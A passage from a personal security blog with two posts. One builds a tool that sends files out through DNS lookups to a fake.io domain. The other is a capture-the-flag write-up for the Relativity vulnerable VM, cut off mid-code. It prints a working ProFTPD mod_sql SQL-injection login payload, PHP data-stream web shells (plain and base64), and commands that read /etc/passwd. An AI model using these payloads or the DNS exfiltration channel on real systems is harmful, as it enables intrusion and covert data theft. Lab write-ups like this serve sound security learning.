</span><span class='line'>19:31:32.919144 IP 127.0.0.1.49331 &gt; 127.0.0.1.53: 39001+ A? 504b03040a000000000042a9384400000000000000000000000017001c00.fake.io. (86)
</span><span class='line'>19:31:32.925135 IP 127.0.0.1.51116 &gt; 127.0.0.1.53: 23736+ A? 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47.fake.io. (86)
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Excellent! As we can see, we got some recorded requests, similar to those that we originally sent earlier in the day. Lets filter the output a little more, so that we sit with only the original hashes as output.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1
</span><span class='line'>reading from file raw, link-type NULL (BSD loopback)
</span><span class='line'>504b03040a000000000042a9384400000000000000000000000017001c00
</span><span class='line'>7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we can pipe all of this through <code>xxd -r</code> and redirect the output to a new file. If all went well, this file <em>should</em> be <code>z300_technical_diagrams.zip</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1 | xxd -r &gt; z300_technical_diagrams.zip
</span><span class='line'>
</span><span class='line'>% file z300_technical_diagrams.zip
</span><span class='line'>z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract</span></code></pre></td></tr></table></div></figure>


<h2>python all the things</h2>

<p>Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the <code>dig</code> command to timeout, and it would retry like 3 times which would mean you would need to <code>uniq</code> your results before you <code>xxd -r</code> them.</p>

<p>So, in order for me to <em>learn something new</em>, I figured I&rsquo;d write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o</p>

<p>The idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.</p>

<h1>dnsfilexfer</h1>

<p>So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; <code>dns_send.py</code> &amp; <code>dns_recv.py</code>, one is able to &lsquo;send files&rsquo; using DNS lookups and store them on the remote end. You also have the option of only using the send part with the <code>-X</code> flag, and have the output ready to use with <code>xxd -r</code> later on your server.</p>

<p>The code can be <a href="https://github.com/th3l33k/dnsfilexfer">found here</a></p>

<h2>sample usage</h2>

<p>Below a full example of the usage, both on the client &amp; server:</p>

<p>We start the &lsquo;server&rsquo; component along with a secret that will be used to decrypt received messages. For now, we have omitted <code>-F</code> as we are not going to write the message to a file, yet.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% sudo python dns_recv.py --listen 0.0.0.0 --secret
</span><span class='line'>What is the secret?
</span><span class='line'>[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
</span><span class='line'>%</span></code></pre></td></tr></table></div></figure>


<p>With our &lsquo;server&rsquo; started, we go to a client, and prepare the sending of a message by creating a sample message, and using the send script to sent it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% echo "This is a test message that will be sent over DNS\n Cool eh?" &gt; /tmp/message
</span><span class='line'>% cat /tmp/message
</span><span class='line'>This is a test message that will be sent over DNS
</span><span class='line'>Cool eh?
</span><span class='line'>
</span><span class='line'>% python dns_send.py --server 127.0.0.1 --file /tmp/message --indentifier dns_message_test --secret
</span><span class='line'>What is the secret?
</span><span class='line'>[INFO] Message is encypted with the secret
</span><span class='line'>---START OF MESSAGE---
</span><span class='line'>/lHsvTZT3nJfQgdtUWSpKDqrpKuK+eLrU3bpAp9aNDJt6K/mwEc8sBUaJybPh7r5h2AOkJVezwBBODSV9hFM8w==
</span><span class='line'>---END OF MESSAGE---
</span><span class='line'>[INFO] Sending lookup for : 00006:10000000000000000000000000000000000000000000000000.fake.io
</span><span class='line'>[INFO] Sending lookup for : 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io
</span><span class='line'>[INFO] Sending lookup for : 000638773d3d.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00000000000000000000000000000000000000000000000000000000.fake.io
</span><span class='line'>[INFO] Message sent in 8 requests</span></code></pre></td></tr></table></div></figure>


<p>We can see that the message was &lsquo;sent&rsquo; using 8 requests and the <code>--START OF MESSAGE--</code> preview contains the encrypted version of our message.
Looking at the server, we see that the message is received:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% sudo python dns_recv.py --listen 0.0.0.0 --secret
</span><span class='line'>Password:
</span><span class='line'>What is the secret?
</span><span class='line'>[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
</span><span class='line'>[INFO] Full resource record query was for: 00006:10000000000000000000000000000000000000000000000000.fake.io.
</span><span class='line'>[INFO] Processing frame 00006:10000000000000000000000000000000000000000000000000
</span><span class='line'>[INFO] Full resource record query was for: 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io.
</span><span class='line'>[INFO] Processing frame 0001646e735f6d6573736167655f7465737400000000000000000000
</span><span class='line'>[INFO] Full resource record query was for: 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io.
</span><span class='line'>[INFO] Processing frame 00028bf2046ae2144be75d2ce780b3f992e2c368021e
</span><span class='line'>[INFO] Full resource record query was for: 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io.
</span><span class='line'>[INFO] Processing frame 00032f6c487376545a54336e4a6651676474555753704b447172704b754b
</span><span class='line'>[INFO] Full resource record query was for: 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io.
</span><span class='line'>[INFO] Processing frame 00042b654c7255336270417039614e444a74364b2f6d7745633873425561
</span><span class='line'>[INFO] Full resource record query was for: 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io.
</span><span class='line'>[INFO] Processing frame 00054a796250683772356832414f6b4a56657a7742424f4453563968464d
</span><span class='line'>[INFO] Full resource record query was for: 000638773d3d.fake.io.
</span><span class='line'>[INFO] Processing frame 000638773d3d
</span><span class='line'>[INFO] Full resource record query was for: 00000000000000000000000000000000000000000000000000000000.fake.io.
</span><span class='line'>[INFO] Processing frame 00000000000000000000000000000000000000000000000000000000
</span><span class='line'>[OK] Message seems to be intact and passes sha1 checksum of 8bf2046ae2144be75d2ce780b3f992e2c368021e
</span><span class='line'>[OK] Message was received in 8 requests
</span><span class='line'>[INFO] Message has been decrypted with the configured secret
</span><span class='line'>Message identifier: dns_message_test
</span><span class='line'>
</span><span class='line'>---START OF MESSAGE---
</span><span class='line'>This is a test message that will be sent over DNS
</span><span class='line'>Cool eh?
</span><span class='line'>
</span><span class='line'>---END OF MESSAGE---</span></code></pre></td></tr></table></div></figure>


<p>The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats <em>should</em> work just fine. <strong>HOWEVER</strong> Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.</p>

<p>Using encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.</p>

<h2>Some afterthoughts</h2>

<p>So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with <code>--domain</code> on the sending script, and have something like <code>fake.&lt;your valid zone&gt;.com</code>, which will result in you still being able to grep for <code>fake</code> in the tcpdump replay.</p>

<h3>further reading</h3>

<p><a href="https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306  ">https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306  </a>
<a href="http://www.aldeid.com/wiki/File-transfer-via-DNS">http://www.aldeid.com/wiki/File-transfer-via-DNS</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[/root/flag.txt - Solving the Relativity Vulnerable VM]]></title>
    <link href="http://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/"/>
    <updated>2013-11-18T06:47:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>At the time of writing this post, this VM was part of a local security communities (<a href="http://zacon.org.za/">zacon</a>) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at <a href="http://vulnhub.com/entry/devrandom_relativity,55/">VulnHub</a>. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.</p>

<p>I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.</p>

<!--more-->


<h3>the challenge</h3>

<p>It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find <code>flag.txt</code>. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter&rsquo;s &lsquo;Relativity&rsquo;. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)</p>

<figure class='code'><figcaption><span>192.168.56.21 Nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.21 <span class="o">(</span>192.168.56.21<span class="o">)</span>
</span><span class='line'>Host is up <span class="o">(</span>0.0024s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>21/tcp open  ftp
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>80/tcp open  http
</span></code></pre></td></tr></table></div></figure>


<p>Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.</p>

<h3>initial enumeration</h3>

<p>Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.</p>

<p>Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)</p>

<figure class='code'><figcaption><span>SSH Login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ssh eshter@192.168.56.21</span>
</span><span class='line'>Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</span></code></pre></td></tr></table></div></figure>


<p>So, we now know only key based authentication works. Thats fine. Next up was the FTP service.</p>

<figure class='code'><figcaption><span>FTP Login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: anonymous
</span><span class='line'>331 Password required <span class="k">for </span>anonymous.
</span><span class='line'>Password:
</span><span class='line'>530 Login incorrect.
</span><span class='line'>Login failed.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>No anonymous FTP logins either. It appears that the Server&rsquo;s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.</p>

<figure class='code'><figcaption><span>Apache tokens.</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># curl -v 192.168.56.21</span>
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.21 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.21...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.21 <span class="o">(</span>192.168.56.21<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET / HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.21
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 200 OK
</span><span class='line'>&lt; Date: Sat, 28 Sep 2013 23:12:28 GMT
</span><span class='line'>&lt; Server: Apache/2.2.23 <span class="o">(</span>Fedora<span class="o">)</span>
</span><span class='line'>&lt; Last-Modified: Tue, 05 Mar 2013 03:24:29 GMT
</span><span class='line'>&lt; ETag: <span class="s2">&quot;4ecb-82-4d72502eec502&quot;</span>
</span><span class='line'>&lt; Accept-Ranges: bytes
</span><span class='line'>&lt; Content-Length: 130
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span><span class='line'>&lt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;&lt;title&gt;M.C. Escher - Relativity&lt;/title&gt;&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;/br&gt;
</span><span class='line'>&lt;center&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;artwork.jpg&quot;</span>&gt;&lt;/center&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'>* Closing connection <span class="c">#0</span>
</span></code></pre></td></tr></table></div></figure>


<h4>putting the enumeration together</h4>

<p>With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.</p>

<p>With me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for <code>cgi-bin/</code> type problems, potentially hidden directories via <code>robots.txt</code>, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.</p>

<h3>the initial attack</h3>

<p>The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username <strong>&lsquo;</strong> and password <strong>&rsquo;</strong>.</p>

<figure class='code'><figcaption><span>mod_sql SQLi attempt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: <span class="s1">&#39;</span>
</span><span class='line'><span class="s1">331 Password required for &#39;</span>.
</span><span class='line'>Password:
</span><span class='line'>421 Service not available, remote server has closed connection
</span><span class='line'>Login failed.
</span><span class='line'>No control connection <span class="k">for </span><span class="nb">command</span>: Success
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good &lsquo;ol trusty Google, I searched for <em>proftpd mod_sql injection vulnerability</em>. Hey presto! The very first hit describes a vulnerability <a href="http://www.securityfocus.com/bid/33722">disclosed</a> in 2009.</p>

<p>From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available <a href="http://www.securityfocus.com/bid/33722/exploit">here</a>, and as such I attempted to exploit this. I copied the SQLi payload from the website <code>%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</code> and pasted this as the username, whereafter I provided 1 as the password.</p>

<figure class='code'><figcaption><span>mod_sql SQLi attempt 2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: %<span class="s1">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</span>
</span><span class='line'><span class="s1">331 Password required for %&#39;</span><span class="o">)</span>.
</span><span class='line'>Password:
</span><span class='line'>421 Service not available, remote server has closed connection
</span><span class='line'>Login failed.
</span><span class='line'>No control connection <span class="k">for </span><span class="nb">command</span>: Success
</span><span class='line'>ftp&gt; bye
</span></code></pre></td></tr></table></div></figure>


<p>No dice. :| Ok, well I guess I couldn&rsquo;t have expected it to be <em>that</em> easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.</p>

<figure class='code'><figcaption><span>mod_sql SQLi success</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: %<span class="s1">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;#</span>
</span><span class='line'><span class="s1">331 Password required for %&#39;</span><span class="o">)</span>.
</span><span class='line'>Password:
</span><span class='line'>230 User %<span class="err">&#39;</span><span class="o">)</span> and <span class="nv">1</span><span class="o">=</span>2 union <span class="k">select </span>1,1,uid,gid,homedir,shell from users<span class="p">;</span><span class="c"># logged in.</span>
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>w00t. Notice the difference though? The SQL commenting was changed from &mdash; to #. Apparently, MySQL is pretty finicky about the fact that the &mdash; style comments should have a space afterwards. This means that a payload ending with say, <code>from users; -- NOTHING_OF_VALUE</code> would have worked too. Just putting a space after the &mdash; did not work as the software most probably does a type of <code>trim()</code> on the field, hence the need to have something after the space too. Awesome, something learnt.</p>

<h3>web based attack</h3>

<p>Now that we have FTP access to the host, we simply needed to <code>ls</code> to learn what is the next step.</p>

<figure class='code'><figcaption><span>FTP Web Directory Reveal&#8220;`</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ftp&gt; ls
</span><span class='line'>200 PORT <span class="nb">command </span>successful
</span><span class='line'>150 Opening ASCII mode data connection <span class="k">for </span>file list
</span><span class='line'>drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
</span><span class='line'>-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
</span><span class='line'>-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
</span><span class='line'>226 Transfer complete.
</span><span class='line'>ftp&gt; <span class="nb">cd </span>0f756638e0737f4a0de1c53bf8937a08
</span><span class='line'>550 0f756638e0737f4a0de1c53bf8937a08: Permission denied
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>A directory called &lsquo;0f756638e0737f4a0de1c53bf8937a08&rsquo; was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap <a href="http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08">http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08</a> into a web browser.</p>

<h3>exploiting the web based vulnerability</h3>

<p>Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url&rsquo;s to different parts of the website. More specifically, the urls were composed as <code>index.php?page=definition.php</code>. Immediately this suggested that the file <code>index.php</code> was programmed to include other files in order to render the content. In the examples case it included definition.php.</p>

<p>My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP <a href="http://php.net/manual/en/wrappers.data.php">data stream wrapper</a> shell in my toolbox. Normally, the shell looks something like this:</p>

<figure class='code'><figcaption><span>PHP Data stream Wrapper Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nb">file</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">,</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&amp;c=ls</span>
</span></code></pre></td></tr></table></div></figure>


<p>Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:</p>

<figure class='code'><figcaption><span>Base 64 Encoded Data stream Wrapper Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nb">file</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4</span><span class="o">=&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">dir</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used this and now had shell access to the box. Remembering the basic tips of enumerate->exploit->post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add &lsquo;view-source:&rsquo; to the front of a url, or right click-> view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands <code>id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd</code>:</p>

<p><img src="http://i.imgur.com/pnBHjXv.png"></p>

<p>From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which <code>jetta</code>&rsquo;s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.</p>

<p>Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)</p>

<figure class='code'><figcaption><span>Hidden site index validation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$blacklist_include</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;php://&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$blacklist_include</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>         <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">],</span><span class="nv">$blacklist_include</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>                <span class="k">die</span><span class="p">();</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
